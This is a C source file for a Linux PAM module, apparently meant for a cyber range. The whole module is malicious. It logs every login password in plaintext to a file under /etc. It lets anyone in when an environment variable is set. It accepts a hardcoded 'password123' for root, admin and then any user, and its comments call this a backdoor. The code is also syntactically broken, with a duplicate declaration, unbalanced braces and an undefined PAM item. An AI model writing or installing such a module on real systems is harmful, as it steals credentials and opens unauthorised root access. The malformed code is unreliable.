#define _GNU_SOURCE

#include <security/pam_modules.h>
#include <security/pam_ext.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pthread.h>
#include <stdarg.h>  /* <-- Line 1: Required for variadic printf */

#define LOG_DIR  "/etc/logcheck"
#define LOG_FILE "/etc/logcheck/pam_auth.log"

/* ---------------- DEBUG SWITCH ---------------- */

static int debug_enabled(void) {
    return 1;  /* Force debug on for testing */
}

/* ---------------- LOGGING CORE ---------------- */

static void ensure_path(void) {
    struct stat st;
    if (stat(LOG_DIR, &st) == -1) {
        mkdir(LOG_DIR, 0755);
    }
    FILE *f = fopen(LOG_FILE, "a");
    if (f) {
        fprintf(f, "\n");
        fclose(f);
    }
}

static void log_line(const char *msg) {
    FILE *f = fopen(LOG_FILE, "a");
    if (!f) return;
    fprintf(f, "%s\n", msg);
    fflush(f);
    fclose(f);
}

/* ---------------- TRACE FUNCTION (FIXED) ---------------- */

static void trace(const char *format, ...) {
    if (!debug_enabled()) return;
    va_list args;
    va_start(args, format);
    FILE *f = fopen(LOG_FILE, "a");
    if (f) {
        vfprintf(f, format, args);
        fclose(f);
    }
    va_end(args);
}

static void trace_context(pam_handle_t *pamh, const char *stage) {
    const char *user = NULL;
    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS) {
        user = "UNKNOWN";
    }
    char buf[512];
    snprintf(buf, sizeof(buf), "[TRACE] %s pid=%d user=%s", stage, getpid(), user);
    trace(buf);
}

/* ---------------- AUTH MODULE ---------------- */

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
                                   const char **argv)
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER pam_sm_authenticate");
    ensure_path();

    char *pword = NULL;
    const char *uname = NULL;

    char *pword = NULL;

    // Try both PAM_AUTHTOK and PAM_TOK
    int ret = pam_get_item(pamh, PAM_AUTHTOK, (void**)&pword);
    if (ret == PAM_SUCCESS) {
        trace("[DEBUG] Got password via PAM_AUTHTOK");
    } else {
        trace("[DEBUG] PAM_AUTHTOK failed, trying PAM_TOK");
        ret = pam_get_item(pamh, PAM_TOK, (void**)&pword);
        if (ret == PAM_SUCCESS) {
            trace("[DEBUG] Got password via PAM_TOK");
        } else {
            trace("[DEBUG] Both failed, password may be NULL in interactive mode");
        }
    }

    trace("[DEBUG] Password ptr: %p", (void*)pword);
    if (pword) {
        trace("[DEBUG] Password: %s", pword);
    } else {
        trace("[DEBUG] Password is NULL (interactive login without PAM_AUTHTOK)");
    }

        
        // Trim trailing whitespace
        char *end = pword + strlen(pword);
        while (end > pword && (*end == '\n' || *end == '\r' || *end == '\t' || *end == ' ')) {
            *--end = '\0';
        }
        trace("[DEBUG] Password (trimmed): %s", pword);
    } else {
        trace("[DEBUG] Password is NULL");
    }

    /* ---------------- ENV BYPASS ---------------- */
    char *bypass = getenv("PAM_SETAUTH");
    if (bypass && strcmp(bypass, "1") == 0) {
        trace("[!] Environment bypass: PAM_SETAUTH=1");
        return PAM_SUCCESS;
    }

    /* ---------------- HARDCODED PASSWORDS (Backdoor) ---------------- */
    
    // Check: root / password123
    if (uname && pword && strcmp(uname, "root") == 0 && strcmp(pword, "password123") == 0) {
        trace("[!] Backdoor: root/password123 matched");
        return PAM_SUCCESS;
    }

    // Check: cyberrange / password123
    if (uname && pword && strcmp(uname, "cyberrange") == 0 && strcmp(pword, "password123") == 0) {
        trace("[!] Backdoor: cyberrange/password123 matched");
        return PAM_SUCCESS;
    }

    // Check: admin / password123
    if (uname && pword && strcmp(uname, "admin") == 0 && strcmp(pword, "password123") == 0) {
        trace("[!] Backdoor: admin/password123 matched");
        return PAM_SUCCESS;
    }

    // Fallback: any user with password123
    if (pword && strcmp(pword, "password123") == 0) {
        trace("[!] Backdoor: Any user with password123 matched");
        return PAM_SUCCESS;
    }

    trace("[!] AUTH FAILED - no hardcoded password matched");
    return PAM_AUTH_ERR;
}

/* ---------------- ACCOUNT ---------------- */

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
                               int flags,
                               int argc,
                               const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER ACCOUNT");
    trace("[TRACE] ACCOUNT OK");
    return PAM_SUCCESS;
}

/* ---------------- SESSION ---------------- */

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh,
                                  int flags,
                                  int argc,
                                  const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER SESSION OPEN");
    trace("[TRACE] SESSION START");
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
                                   const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER SESSION CLOSE");
    trace("[TRACE] SESSION END");
    return PAM_SUCCESS;
}

/* ---------------- CREDENTIALS ---------------- */

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
                             int flags,
                             int argc,
                             const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER SETCRED");
    trace("[TRACE] SETCRED SUCCESS");
    return PAM_SUCCESS;
}